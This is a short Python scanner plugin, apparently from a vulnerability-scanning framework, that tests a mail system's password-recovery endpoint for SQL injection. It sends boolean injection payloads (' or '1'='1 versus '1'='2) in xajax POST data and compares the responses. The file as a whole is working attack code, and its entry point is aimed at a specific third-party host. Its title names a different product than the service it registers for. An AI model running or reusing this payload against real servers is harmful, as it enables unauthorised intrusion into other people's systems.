#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:workyi_Talent system SQL injection
#author: xx00
#ref: http://www.wooyun.org/bugs/wooyun-2010-065810


def assign(service, arg):
    if service == "kxmail":
        return True, arg


def audit(arg):
    url = arg + 'prog/get_passwd.server.php'
    postdata1 = "xjxfun=DoOperate&xjxr=1403400674828&xjxargs[]=<xjxobj><e><k>setup</k><v>S1</v></e><e><k>user</k><v>S<![CDATA[postmaster@111' or '1'='1]]></v></e></xjxobj>"
    postdata2 = "xjxfun=DoOperate&xjxr=1403400674828&xjxargs[]=<xjxobj><e><k>setup</k><v>S1</v></e><e><k>user</k><v>S<![CDATA[postmaster@111' or '1'='2]]></v></e></xjxobj>"
    code, head, res1, errcode, _ = curl.curl2(url,post=postdata1)
    code, head, res2, errcode, _ = curl.curl2(url,post=postdata2)
    if code == 200 and '/prog/get_passwd_1.php'   in res1 and  '/prog/get_passwd_1.php' not in res2:
        security_warning(url)



if __name__ == '__main__':
    from dummy import *
    audit(assign('kxmail', 'http://mail.cdzk.org:8888/')[1])